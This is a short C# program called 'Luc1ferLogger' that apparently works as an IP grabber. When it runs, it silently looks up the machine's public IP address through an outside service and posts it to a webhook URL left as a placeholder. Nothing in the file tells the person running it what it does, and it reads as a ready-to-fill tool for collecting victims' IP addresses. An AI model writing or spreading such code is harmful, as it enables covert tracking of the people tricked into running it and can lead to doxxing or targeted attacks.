using System;
using System.Collections.Specialized;
using System.Net;
using Luc1ferLogger;

namespace Luc1ferLogger
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            string WebHookURL = "YOUR WEBHOOK URL HERE";
            sendWebHook(WebHookURL, "```" + "IP: " + GetIP() + "```");
        }

        public static void sendWebHook(string URL, string msg)
        {
            Http.Post(URL, new NameValueCollection()
            {
                {
                    "content",
                    msg
                }
            });

        }
        public static string GetIP()
        {
            string IP = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
            return IP;
        }
    }
}
